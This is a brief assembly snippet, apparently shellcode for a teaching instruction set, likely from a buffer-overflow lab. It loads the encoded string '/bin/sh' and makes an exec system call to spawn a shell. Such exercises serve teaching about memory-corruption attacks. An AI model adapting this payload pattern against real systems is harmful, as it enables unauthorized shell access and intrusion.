ld $7, r1     #st buffer size to r1
gpc $4, r0    # set the buffer address using gpc
gpc $0xa, r3  # r3 = address of sys call
j (r3)        # jump to r3
.long 0x2f62696e
.long 0x2f736800
sys $2        # call exec
halt